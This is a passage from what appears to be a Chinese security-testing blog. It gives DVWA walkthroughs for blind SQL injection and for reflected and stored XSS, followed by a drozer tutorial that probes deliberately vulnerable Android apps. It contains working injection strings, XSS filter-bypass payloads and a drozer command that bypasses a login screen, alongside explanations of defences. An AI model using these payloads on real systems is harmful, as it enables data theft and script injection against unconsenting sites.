<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 # </span><br></pre></td></tr></table></figure>

<ul>
<li>安装上述所述，依次类推可以分别得到uestbook等的值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--值为u</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117 # </span><br><span class="line"></span><br><span class="line">--值为e</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=101 #</span><br></pre></td></tr></table></figure>

<ul>
<li>比如第二个表（users)的第一个数据的ascii值为u</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--注意limit的值取的是第2条至第3条记录，就是第二个表，得到的值为u</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,2),1,1))=117#</span><br><span class="line"></span><br><span class="line">-- 值为s</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,2),2,1))=115#</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/98d7c1e5/image-20220211095417168.png" alt="image-20220211095417168"></p>
<h2 id="安全等级为Medium"><a href="#安全等级为Medium" class="headerlink" title="安全等级为Medium"></a>安全等级为Medium</h2><p><img src="/aposts/98d7c1e5/image-20220211100841155.png" alt="image-20220211100841155"></p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li><p>可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,’,”,\x1a进行转义；</p>
</li>
<li><p>同时设置了下拉选择表单，控制用户的输入；</p>
</li>
<li><p>可以简单看出，用户只能选择1-5，存在数字型SQL注入；</p>
</li>
</ul>
<p><img src="/aposts/98d7c1e5/image-20220211100943860.png" alt="image-20220211100943860"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li><p>没有实际操作，偷懒用别人的图片</p>
</li>
<li><p>虽然使用了下拉选择菜单，但是我们可以通过抓包修改参数，实现SQL注入；</p>
</li>
<li><p>把id的值改为：<code>1 and length(database())=4</code></p>
</li>
</ul>
<p><img src="/aposts/98d7c1e5/image-20220211101224589.png" alt="image-20220211101224589"></p>
<ul>
<li>接下来的操作与low级别基本上相似，只是<strong>不需要1后面的单引号和最后的#</strong></li>
</ul>
<h2 id="安全等级High"><a href="#安全等级High" class="headerlink" title="安全等级High"></a>安全等级High</h2><p><img src="/aposts/98d7c1e5/image-20220211101516972.png" alt="image-20220211101516972"></p>
<h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li><p>High级别在SQL查询语句中添加了LIMIT 1，以此控制只输入一个结果；</p>
</li>
<li><p><img src="/aposts/98d7c1e5/image-20220211101606213.png" alt="image-20220211101606213"></p>
</li>
</ul>
<h3 id="开始攻击-2"><a href="#开始攻击-2" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉，如输入：<code>1&#39; and length(database()) =4 #</code></li>
</ul>
<p><img src="/aposts/98d7c1e5/image-20220211101738184.png" alt="image-20220211101738184"></p>
<ul>
<li><p>接下来的操作与low级别一样；</p>
</li>
<li><p>虽然源码中限制了输入的长度为1，但是我们在输入的最后加个#，就可以注释掉源码中的limit 1；</p>
</li>
<li><p>在High级别中，不适合用基于时间的盲注，因为High级别的源码中显示，不论猜解正确或者错误，都会sleep（rand(2,4)）;</p>
</li>
</ul>
<h2 id="安全等级Impossible"><a href="#安全等级Impossible" class="headerlink" title="安全等级Impossible"></a>安全等级Impossible</h2><p><img src="/aposts/98d7c1e5/image-20220211102110754.png" alt="image-20220211102110754"></p>
<h3 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h3><p><img src="/aposts/98d7c1e5/image-20220211102044615.png" alt="image-20220211102044615"></p>
<p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入；</p>
<p>同时只有返回的查询结果数量为1时，才会输出；</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>sql盲注太耗时了，需要看测试时间，看看是否值得投入测试</p>
</li>
<li><p>本文操作步骤主要来自<a href="https://blog.csdn.net/qq_38684504/article/details/89849978">这里</a>和<a href="https://blog.csdn.net/weixin_43198291/article/details/114383142">这里</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-XSS(Reflect)-反射性xss</title>
    <url>/aposts/93c2ee93/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul>
<li><p>上篇介绍了<a href="https://moon-full.gitee.io/2022/02/14/DVWA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-DOM-XSS-DOM%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">DVWA通关指南-DOM-XSS-DOM型跨站脚本攻击</a>，本篇开始介绍(Reflect)-反射性xss</p>
</li>
<li><p>反射性xss，<strong>主要需要通过URL构造等手段，才能触发的XSS漏洞</strong>，非持久化；反射型xss实际上是包括了dom - xss了，关键点仍然是在通过url控制了页面的输出（dom-xss也类似，只因为输出地点不同而导致结果不一致）。</p>
</li>
<li><p>常见注入代码</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> <span class="attr">hidden</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="安全等级Low"><a href="#安全等级Low" class="headerlink" title="安全等级Low"></a>安全等级Low</h2><p><img src="/aposts/93c2ee93/image-20220214153149478.png" alt="image-20220214153149478"></p>
<h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><ul>
<li>只是判断了name是否有值，其他没有做过滤</li>
</ul>
<p><img src="/aposts/93c2ee93/image-20220214153326675.png" alt="image-20220214153326675"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>直接修改<code>name=&lt;script&gt;alert(1)&lt;/script&gt;#</code></p>
<p><img src="/aposts/93c2ee93/image-20220214154450772.png" alt="image-20220214154450772"></p>
<h2 id="安全等级为Medium"><a href="#安全等级为Medium" class="headerlink" title="安全等级为Medium"></a>安全等级为Medium</h2><p><img src="/aposts/93c2ee93/image-20220214154719159.png" alt="image-20220214154719159"></p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>过滤了script标签</p>
<p><img src="/aposts/93c2ee93/image-20220214154548875.png" alt="image-20220214154548875"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>直接把script改成大写：<code>name=&lt;Script&gt;alert(1)&lt;/Script&gt;#</code></p>
<p><img src="/aposts/93c2ee93/image-20220214154936849.png" alt="image-20220214154936849"></p>
<h2 id="安全等级为High"><a href="#安全等级为High" class="headerlink" title="安全等级为High"></a>安全等级为High</h2><p><img src="/aposts/93c2ee93/image-20220214155355958.png" alt="image-20220214155355958"></p>
<h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>替换所有与<code>&lt;script&gt;</code>相关的字符，那么就采用a或iframe等无需script标签的方式绕过。</p>
<p><img src="/aposts/93c2ee93/image-20220214155324591.png" alt="image-20220214155324591"></p>
<h3 id="开始攻击-2"><a href="#开始攻击-2" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li>采用a标签：<code>name=&lt;a href=http://XXX.xxx.xx.xx&gt;登录&lt;/a&gt;</code>，可以直接点击登录</li>
</ul>
<p><img src="/aposts/93c2ee93/image-20220214160517561.png" alt="image-20220214160517561"></p>
<h2 id="安全等级为Impossible"><a href="#安全等级为Impossible" class="headerlink" title="安全等级为Impossible"></a>安全等级为Impossible</h2><p><img src="/aposts/93c2ee93/image-20220214160654149.png" alt="image-20220214160654149"></p>
<h3 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h3><p>用了<code>htmlspecialchars</code>函数，将特殊字符转换为 HTML 实体</p>
<p><img src="/aposts/93c2ee93/image-20220214160741582.png" alt="image-20220214160741582"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>利用：如果没有对特殊字符进行HTML转义，都存在被XSS利用的漏洞</p>
</li>
<li><p>防御：数据返回前端页面前，将【&lt;】【&gt;】【”】【’】【&amp;】全转义了，既可！</p>
</li>
<li><p>本文主要步骤来自<a href="https://blog.csdn.net/qqchaozai/article/details/102755283">这里</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-XSS(Stored)</title>
    <url>/aposts/a672bb74/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul>
<li><p>上篇介绍了<a href="https://moon-full.gitee.io/2022/02/14/DVWA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-XSS-Reflect-%E5%8F%8D%E5%B0%84%E6%80%A7xss/">DVWA通关指南-XSS(Reflect)-反射性xss</a>，本篇开始介绍储存型跨站脚本攻击。</p>
</li>
<li><p>就是被后台进行了持久化处理。再次访问的时候会被调用执行</p>
</li>
</ul>
<h3 id="三种xss区别"><a href="#三种xss区别" class="headerlink" title="三种xss区别"></a>三种xss区别</h3><ul>
<li><p>存储型XSS：你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；</p>
</li>
<li><p>反射型XSS：你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；</p>
</li>
<li><p>DOM型XSS：你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子</p>
</li>
</ul>
<h2 id="安全等级为Low"><a href="#安全等级为Low" class="headerlink" title="安全等级为Low"></a>安全等级为Low</h2><p><img src="/aposts/a672bb74/image-20220214162317853.png" alt="image-20220214162317853"></p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li><p><code>trim(string,charlist)</code>：移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符；</p>
</li>
<li><p><code>mysql_real_escape_string(string,connection)</code>：对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义；</p>
</li>
<li><p><code>stripslashes(string)</code>：删除字符串中的反斜杠。</p>
</li>
</ul>
<p>从源码中可以看到，对输入的name参数和message参数并没有做XSS方面的过滤与检查，并且数据存储在数据库中，所以存在明显的存储型XSS漏洞；</p>
<p><img src="/aposts/a672bb74/image-20220214162356195.png" alt="image-20220214162356195"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li>message输入：<code> &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>，点击sign按钮，出现弹框</li>
</ul>
<p><img src="/aposts/a672bb74/image-20220214162716214.png" alt="image-20220214162716214"></p>
<p><img src="/aposts/a672bb74/image-20220214162838286.png" alt="image-20220214162838286"></p>
<h2 id="安全等级为Meduim"><a href="#安全等级为Meduim" class="headerlink" title="安全等级为Meduim"></a>安全等级为Meduim</h2><p> 清空数据后，然后把low的攻击代码提交后，不成功</p>
<p><img src="/aposts/a672bb74/image-20220214164219024.png" alt="image-20220214164219024"></p>
<h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li><p>由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码；</p>
</li>
<li><p>但是对于name参数，这里是基于黑名单的思想，使用str_replace函数将输入中的script删除，把script脚本当做字符串来处理；仍然存在存储型的XSS。</p>
</li>
</ul>
<p><img src="/aposts/a672bb74/image-20220214164518016.png" alt="image-20220214164518016"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li>修改name的长度为100</li>
</ul>
<p><img src="/aposts/a672bb74/image-20220214171718344.png" alt="image-20220214171718344"></p>
<p>name输入<code>&lt;img src=x onerror=alert(1)&gt;</code>，<strong>message攻击失败</strong></p>
<p><img src="/aposts/a672bb74/image-20220214171810074.png" alt="image-20220214171810074"></p>
<p><img src="/aposts/a672bb74/image-20220214171845355.png" alt="image-20220214171845355"></p>
<ul>
<li><p>每次打开这个页面，都会出现弹框</p>
</li>
<li><p><strong>当然还可以尝试</strong>，大写绕过：<code>&lt;ScRipt&gt;alert(1)&lt;ScRipt&gt;</code>和双写绕过：<code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code>等</p>
</li>
</ul>
<h2 id="安全等级为High"><a href="#安全等级为High" class="headerlink" title="安全等级为High"></a>安全等级为High</h2><h3 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h3><p>都用到了preg_replace()函数，它彻底的过滤了<code>&lt;script&gt;&lt;/script&gt;</code>，不能绕过，同时针对于message模块，也有相当强大的过滤策略，message不存在存储型XSS漏洞</p>
<p><img src="/aposts/a672bb74/image-20220214172543801.png" alt="image-20220214172543801"></p>
<h3 id="开始攻击-2"><a href="#开始攻击-2" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>采用安全等级为meduim一样的方式，name输入： <code>&lt;img src=x onerror=alert(1)&gt;</code>，<strong>img调用图片，src所描述路径不存在，会导致onerror执行</strong>，从而时alert(1)函数触发，回显1</p>
<h2 id="安全等级为impossible"><a href="#安全等级为impossible" class="headerlink" title="安全等级为impossible"></a>安全等级为impossible</h2><h3 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li>在impossible等级下，针对于message与name模块都使用 <code>stripslashes()</code>、<code>mysql_real_escape_string()</code>、以及<code>htmlspecialchars()</code>函数</li>
<li>并且对于已经存在的xss数据，当前页面也会过滤，<strong>如果是低，中，高的安全等级对于已经存在的xss，再次打开页面时，会弹出提示框</strong></li>
</ul>
<p><img src="/aposts/a672bb74/image-20220214172949782.png" alt="image-20220214172949782"></p>
<p><strong>本文操作步骤主要来自<a href="https://blog.csdn.net/weixin_43726831/article/details/103168728?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_default&utm_relevant_index=5">这里</a></strong></p>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>Drozer实践</title>
    <url>/aposts/2b1c1b8c/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>drozer</code>是一款针对<code>Android</code>系统的安全测试框架，可以分成两个部分：其一是<code>console</code>，它运行在本地计算机上；其二是<code>server</code>，它是一个安装在目标<code>Android</code>设备上的<code>app</code>，当使用<code>console</code>与<code>Android</code>设备交互时，就是把<code>Java</code>代码输入到运行在实际设备上的<code>drozer</code>代理(<code>agent</code>)中。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
<li>本地电脑安装<code>jdk1.7</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Admin&gt;java --version</span><br><span class="line">java 17.0.2 2022-01-18 LTS</span><br><span class="line">Java(TM) SE Runtime Environment (build 17.0.2+8-LTS-86)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 17.0.2+8-LTS-86, mixed mode, sharing)</span><br></pre></td></tr></table></figure>

<ul>
<li>本地电脑装<code>adb</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Admin&gt;adb --version</span><br><span class="line">Android Debug Bridge version 1.0.40</span><br><span class="line">Version 4986621</span><br></pre></td></tr></table></figure>

<ul>
<li>本地python的版本，记得配置好环境变量</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Admin&gt;python --version</span><br><span class="line">Python 2.7.15</span><br></pre></td></tr></table></figure>

<ul>
<li>下载<code>drozer-2.4.4.win32.msi</code><a href="https://github.com/mwrlabs/drozer">最新版本</a></li>
</ul>
<p><img src="/aposts/2b1c1b8c/image-20220407085705247.png" alt="image-20220407085705247"></p>
<ul>
<li>在<code>python2.7</code>的<code>script</code>目录可以看到安装的<code>drozer</code></li>
</ul>
<p><img src="/aposts/2b1c1b8c/image-20220407085922571.png" alt="image-20220407085922571"></p>
<ul>
<li>下载<a href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk">drozer-agent-2.3.4.apk</a>安装包，安装到模拟器中(雷电)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Admin&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">* daemon not running; starting now at tcp:5037</span><br><span class="line">* daemon started successfully</span><br><span class="line">emulator-5554   device</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Admin&gt;adb install d:\appsafetest\drozer-agent-2.3.4.apk</span><br><span class="line">Success</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/2b1c1b8c/image-20220407090727709.png" alt="image-20220407090727709"></p>
<ul>
<li>模拟器中启动server</li>
</ul>
<p><img src="/aposts/2b1c1b8c/image-20220407093534775.png" alt="image-20220407093534775"></p>
<ul>
<li>安装依赖文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br><span class="line">pip install pyyaml</span><br><span class="line">pip install protobuf==3.17.3 # 一定要这个版本，用最新的版本无法启动drozer</span><br><span class="line">pip install pyOpenSSL</span><br><span class="line">pip install twisted</span><br><span class="line">pip install service_identity</span><br></pre></td></tr></table></figure>

<ul>
<li>使用 <code>adb </code>进行端口转发，转发到上边<code>Drozer</code>使用的端口 <code>31415</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure>

<ul>
<li>测试是否可以启动<code>drozer</code><ul>
<li>一定要用<code>cd</code>进入到<code>drozer</code>的安装目录（<code>D:\app\Python27\Scripts</code>），不然<code>drozer</code>不能正常使用</li>
<li>然后执行<code>drozer.bat console connect</code>连接<code>drozer</code>的<code>server</code></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd D:\app\Python27\Scripts</span><br><span class="line"></span><br><span class="line">D:\app\Python27\Scripts&gt;drozer.bat console connect</span><br><span class="line"></span><br><span class="line">            ..                    ..:.</span><br><span class="line">           ..o..                  .r..</span><br><span class="line">            ..a..  . ....... .  ..nd</span><br><span class="line">              ro..idsnemesisand..pr</span><br><span class="line">              .otectorandroidsneme.</span><br><span class="line">           .,sisandprotectorandroids+.</span><br><span class="line">         ..nemesisandprotectorandroidsn:.</span><br><span class="line">        .emesisandprotectorandroidsnemes..</span><br><span class="line">      ..isandp,..,rotectorandro,..,idsnem.</span><br><span class="line">      .isisandp..rotectorandroid..snemisis.</span><br><span class="line">      ,andprotectorandroidsnemisisandprotec.</span><br><span class="line">     .torandroidsnemesisandprotectorandroid.</span><br><span class="line">     .snemisisandprotectorandroidsnemesisan:</span><br><span class="line">     .dprotectorandroidsnemesisandprotector.</span><br><span class="line"></span><br><span class="line">drozer Console (v2.4.4)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>查看下<code>drozer</code>的模块列表</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt; list</span><br><span class="line">app.activity.forintent                   Find activities that can handle the given intent</span><br><span class="line">app.activity.info                        Gets information about exported activities.</span><br><span class="line">app.activity.start                       Start an Activity</span><br><span class="line">app.broadcast.info                       Get information about broadcast receivers</span><br><span class="line">app.broadcast.send                       Send broadcast using an intent</span><br><span class="line">app.broadcast.sniff                      Register a broadcast receiver that can sniff particular intents</span><br><span class="line">app.package.attacksurface                Get attack surface of package</span><br><span class="line">app.package.backup                       Lists packages that use the backup API (returns true on FLAG_ALLOW_BACKUP)</span><br><span class="line">app.package.debuggable                   Find debuggable packages</span><br><span class="line">.....</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>常用模块</li>
</ul>
<table>
<thead>
<tr>
<th>模块名</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>app.activity.forintent</td>
<td>通过intent查找它的activity</td>
</tr>
<tr>
<td>app.activity.info</td>
<td>获取activities信息</td>
</tr>
<tr>
<td>app.activity.start</td>
<td>开启 Activity</td>
</tr>
<tr>
<td>app.broadcast.info</td>
<td>获取broadcast receivers信息</td>
</tr>
<tr>
<td>app.broadcast.send</td>
<td>发送广播</td>
</tr>
<tr>
<td>app.broadcast.sniff</td>
<td>嗅探广播中intent的数据</td>
</tr>
<tr>
<td>app.package.attacksurface</td>
<td>确定安装包的可攻击面</td>
</tr>
<tr>
<td>app.package.backup</td>
<td>列出可备份的包</td>
</tr>
<tr>
<td>app.package.debuggable</td>
<td>列出可debug的包</td>
</tr>
<tr>
<td>app.package.info</td>
<td>获取已安装包的信息</td>
</tr>
<tr>
<td>app.package.launchintent</td>
<td>获取程序启动的activity信息</td>
</tr>
<tr>
<td>app.package.list</td>
<td>手机已安装的程序包</td>
</tr>
<tr>
<td>app.package.manifest</td>
<td>获取程序manifest文件信息</td>
</tr>
<tr>
<td>app.package.native</td>
<td>列出Native libraries 信息</td>
</tr>
<tr>
<td>app.package.shareduid</td>
<td>查找拥有共同uid的包和他们所有的权限</td>
</tr>
<tr>
<td>app.provider.columns</td>
<td>展示content provider URI的各列</td>
</tr>
<tr>
<td>app.provider.delete</td>
<td>删除content provider URI的内容</td>
</tr>
<tr>
<td>app.provider.download</td>
<td>使用openInputStream读取指定uri的内容，并下载在电脑中</td>
</tr>
<tr>
<td>app.provider.info	获取</td>
<td>content providers信息</td>
</tr>
<tr>
<td>app.provider.insert</td>
<td>插入数据到content provider</td>
</tr>
<tr>
<td>app.provider.query</td>
<td>查询content provider 内容</td>
</tr>
<tr>
<td>app.provider.read</td>
<td>使用openInputStream读取指定uri的内容</td>
</tr>
<tr>
<td>app.provider.update</td>
<td>更新content provider的内容</td>
</tr>
<tr>
<td>app.service.info</td>
<td>获取services的信息</td>
</tr>
<tr>
<td>app.service.send</td>
<td>使用 Message攻击暴露的service，其service实现了handleMessage</td>
</tr>
<tr>
<td>app.service.start</td>
<td>开启服务</td>
</tr>
<tr>
<td>app.service.stop</td>
<td>停止服务</td>
</tr>
</tbody></table>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul>
<li>本次的apk来自于<a href="https://github.com/as0ler/Android-Examples/blob/master/sieve.apk">这里</a>，提前安装到模拟器上</li>
<li>测试步骤来源<a href="https://www.jianshu.com/p/dfa92bab3a55">这里</a>，非常感谢此博客的分享</li>
<li>查找包含<code>sieve</code>的包名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.package.list -f sieve</span><br><span class="line">com.mwr.example.sieve (Sieve)</span><br></pre></td></tr></table></figure>

<ul>
<li>查看包名的信息，我们已经获得应用数据目录、apk的路径、UID、GID等信息。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.package.info -a  com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  Application Label: Sieve</span><br><span class="line">  Process Name: com.mwr.example.sieve</span><br><span class="line">  Version: 1.0</span><br><span class="line">  Data Directory: /data/user/0/com.mwr.example.sieve</span><br><span class="line">  APK Path: /data/app/com.mwr.example.sieve-1/base.apk</span><br><span class="line">  UID: 10039</span><br><span class="line">  GID: [3003]</span><br><span class="line">  Shared Libraries: null</span><br><span class="line">  Shared User ID: null</span><br><span class="line">  Uses Permissions:</span><br><span class="line">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.INTERNET</span><br><span class="line">  Defines Permissions:</span><br><span class="line">  - com.mwr.example.sieve.READ_KEYS</span><br><span class="line">  - com.mwr.example.sieve.WRITE_KEYS</span><br></pre></td></tr></table></figure>

<h3 id="确定可攻击面"><a href="#确定可攻击面" class="headerlink" title="确定可攻击面"></a>确定可攻击面</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface com.mwr.example.sieve</span><br><span class="line">Attack Surface:</span><br><span class="line">  3 activities exported</span><br><span class="line">  0 broadcast receivers exported</span><br><span class="line">  1 content providers exported</span><br><span class="line">  0 services exported</span><br><span class="line">    is debuggable</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h3 id="activity组件"><a href="#activity组件" class="headerlink" title="activity组件"></a>activity组件</h3><blockquote>
<p>应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity之间通过Intent进行通信。在Intent的描述结构中，有两个最重要的部分：动作和动作对应的数据。</p>
</blockquote>
<ul>
<li>通过上边的命令可以发现<code>activity</code>存在问题，我们查看下用<code>apktool d sieve.apk</code>反编译出的的安装包的<code>AndroidManifest.xml</code>文件，可看到将<code>activity</code>的<code>exported</code>设置为<code>true</code>。说明存在被导出的分险</li>
</ul>
<p><img src="/aposts/2b1c1b8c/image-20220407105213231.png" alt="image-20220407105213231"></p>
<ul>
<li>查看对外的activity组件信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt;  run app.activity.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  com.mwr.example.sieve.FileSelectActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.MainLoginActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.PWList</span><br><span class="line">    Permission: null</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>app.activity.start</code>进行漏洞测试</li>
</ul>
<blockquote>
<p>越权漏洞–绕过登录界面导致可直接访问Your Passwords界面，说明存在越权漏洞</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/2b1c1b8c/image-20220407104315393.png" alt="image-20220407104315393"></p>
<h3 id="Broadcast组件"><a href="#Broadcast组件" class="headerlink" title="Broadcast组件"></a>Broadcast组件</h3><blockquote>
<p>BroadcastReceive广播接收器应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。</p>
</blockquote>
<ul>
<li><p>本次演练的apk来自于<a href="https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk">这里</a></p>
</li>
<li><p>下面使用<code>fourgoats.apk</code>测试<code>Broadcast</code>。查看<code>fourgoats</code>该APP的可攻击点，可以看到存在<code>broadcast</code>广播问题。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface org.owasp.goatdroid.fourgoats</span><br><span class="line">Attack Surface:</span><br><span class="line">  4 activities exported</span><br><span class="line">  1 broadcast receivers exported # 发现这里有一个广播可攻击</span><br><span class="line">  0 content providers exported</span><br><span class="line">  1 services exported</span><br><span class="line">    is debuggable</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>app.activity.start</code>进行漏洞测试查看对外的<code>broadcas</code>t组件信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.broadcast.info -a org.owasp.goatdroid.fourgoats</span><br><span class="line">Package: org.owasp.goatdroid.fourgoats</span><br><span class="line">  org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver</span><br><span class="line">    Permission: null</span><br></pre></td></tr></table></figure>

<ul>
